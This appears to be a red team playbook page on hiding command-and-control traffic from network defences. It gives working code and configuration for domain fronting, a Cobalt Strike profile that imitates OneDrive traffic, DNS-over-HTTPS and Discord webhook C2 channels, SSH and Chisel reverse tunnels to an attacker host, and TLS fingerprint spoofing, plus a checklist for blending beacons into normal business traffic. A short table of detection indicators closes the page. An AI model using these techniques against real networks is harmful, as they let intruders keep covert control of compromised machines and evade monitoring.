# Network-Level Evasion

> **MITRE ATT&CK**: Defense Evasion > T1071 - Application Layer Protocol
> **Platforms**: Windows, Linux, macOS
> **Required Privileges**: User
> **OPSEC Risk**: Medium

## Strategic Overview

Network-level evasion hides C2 communications from firewalls, IDS/IPS, proxy inspection, DNS monitoring, and network EDR. For a Red Team Lead, network evasion determines whether your implant survives beyond initial execution -- endpoint evasion keeps it running, network evasion keeps it communicating. The strategic approach is to make C2 traffic indistinguishable from legitimate organizational patterns. Modern detection relies on behavioral analysis and TLS fingerprinting, so encryption alone is insufficient.

## Technical Deep-Dive

### Domain Fronting

Route C2 through a CDN so network inspection sees only trusted domain connections:

```
TLS connection -->  SNI: allowed-domain.cloudfront.net    (what firewall/proxy sees)
HTTP request   -->  Host: c2-domain.cloudfront.net        (what CDN routes on)
```

```python
import requests
session = requests.Session()
session.headers.update({
    'Host': 'attacker-c2.cloudfront.net',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
})
response = session.get('https://allowed-domain.cloudfront.net/api/status', verify=True)
```

**Note**: Major CDNs (AWS, Azure, Google) have implemented countermeasures. Research Fastly, smaller CDNs, or domain-borrowing alternatives.

### Malleable C2 Profiles (Cobalt Strike)

```
# Mimic Microsoft OneDrive traffic
set sleeptime "30000"; set jitter "37";
set useragent "Microsoft SkyDriveSync 17.005.0107.0008 ship; Windows NT 10.0 (16299)";
http-get {
    set uri "/v1.0/me/drive/root/delta";
    client {
        header "Accept" "application/json";
        header "Authorization" "bearer ms_token_value";
        metadata { base64url; prepend "access_token="; header "Cookie"; }
    }
    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "Server" "Microsoft-IIS/10.0";
        output { base64url;
            prepend "{\"@odata.context\":\"https://graph.microsoft.com\",\"value\":[{\"id\":\"";
            append "\"}]}"; print; }
    }
}
```

### DNS-Based C2

```
# DNS tunneling: data encoded in subdomain queries
# Beacon -> DNS query: aGVsbG8=.c2.attacker.com
# C2     -> DNS response: TXT record with base64 commands
# Tools: dnscat2, iodine, DNSTT, Cobalt Strike DNS beacon
```

**DNS over HTTPS (DoH)** -- bypass DNS monitoring entirely:

```python
import requests
def doh_query(domain, doh_server="https://cloudflare-dns.com/dns-query"):
    headers = {'Accept': 'application/dns-json'}
    response = requests.get(doh_server, headers=headers, params={'name': domain, 'type': 'TXT'})
    return response.json().get('Answer', [{}])[0].get('data', '')
# Network monitors see HTTPS to cloudflare-dns.com, not DNS queries
command = doh_query("cmd.c2.attacker.com")
```

### Cloud-Based C2 Channels

```python
# Azure Functions: traffic shows HTTPS to *.azurewebsites.net (Microsoft IP space)
# Google Apps Script: traffic appears as Google API calls
# Discord webhook C2 example:
import requests, base64
webhook_url = "https://discord.com/api/webhooks/WEBHOOK_ID/TOKEN"
def beacon(data):
    requests.post(webhook_url, json={"content": base64.b64encode(data).decode()})
def get_commands(bot_token, channel_id):
    headers = {"Authorization": f"Bot {bot_token}"}
    return requests.get(f"https://discord.com/api/v10/channels/{channel_id}/messages",
                        headers=headers).json()
```

### Protocol Tunneling

```bash
# SSH tunneling (Linux targets)
ssh -D 9050 -N -f attacker@c2.attacker.com   # SOCKS proxy
ssh -R 8080:localhost:80 attacker@c2.attacker.com  # Reverse tunnel
# Chisel -- HTTP tunneling with SOCKS support
# Server: chisel server --reverse --port 8443
# Client: chisel client https://c2.attacker.com:8443 R:socks
# ICMP tunneling: encapsulate data in ICMP payloads (ptunnel, icmpsh)
```

### Traffic Blending Checklist

```
[ ] Match work hours -- C2 callbacks during business hours only (8am-6pm local)
[ ] Match request frequency -- align sleep/jitter with typical browsing patterns
[ ] Match User-Agent -- use the organization's standard browser UA string
[ ] Use HTTPS with valid cert -- Let's Encrypt for C2 domain
[ ] Honor proxy settings -- auto-detect corporate proxy with NTLM/Kerberos auth
[ ] Match destination patterns -- C2 hosted in same cloud provider the org uses
```

### Proxy-Aware C2

```csharp
WebRequest.DefaultWebProxy = WebRequest.GetSystemWebProxy();
WebRequest.DefaultWebProxy.Credentials = CredentialCache.DefaultCredentials;
```

### JA3/JA3S Fingerprint Evasion

```go
// Go uTLS -- mimic Chrome's JA3 fingerprint
import tls "github.com/refraction-networking/utls"
config := tls.Config{ServerName: "c2.attacker.com"}
conn, _ := tls.Dial("tcp", "c2.attacker.com:443", &config,
    &tls.ClientHelloID{Client: "Chrome", Version: "102"})
```

Default Cobalt Strike JA3 (`72a589da586844d7f0818ce684948eea`) is widely signatured. Evasion: uTLS randomization, Nginx/Caddy reverse proxy for TLS termination, JARM fingerprint rotation.

## Detection & Evasion

| Indicator | Source | Notes |
|-----------|--------|-------|
| SNI/Host header mismatch | TLS inspection / proxy | Domain fronting indicator |
| High-entropy DNS subdomains | DNS monitoring | DNS tunneling indicator |
| Beaconing patterns | Behavioral analysis | Regular callbacks with fixed jitter |
| Known C2 JA3 hashes | Fingerprint databases | Default tool fingerprints |
| Unusual cloud API usage | CASB / cloud proxy | Non-standard API calls |
| Long-lived HTTPS sessions | Netflow / proxy logs | Persistent C2 connections |

**Evasion Guidance**: Profile the network before deploying C2. Use high-reputation domains (cloud, CDN, SaaS). Randomize JA3 fingerprints. Implement adaptive sleep varying by time of day. Maintain multiple C2 channels (primary HTTPS, fallback DNS, emergency OOB). Test against the organization's specific network security stack.

## Cross-References

- [AV/EDR Evasion](av-edr-evasion.md) -- endpoint and network evasion must work together
- [Logging Evasion](logging-evasion.md) -- network logs complement host logs in detection
- [Signature Evasion](signature-evasion.md) -- network signatures parallel host-based signatures

## References

- Domain fronting research: https://www.bamsoftware.com/papers/fronting/
- JA3: https://github.com/salesforce/ja3
- JARM: https://github.com/salesforce/jarm
- dnscat2: https://github.com/iagox86/dnscat2
- Chisel: https://github.com/jpillora/chisel
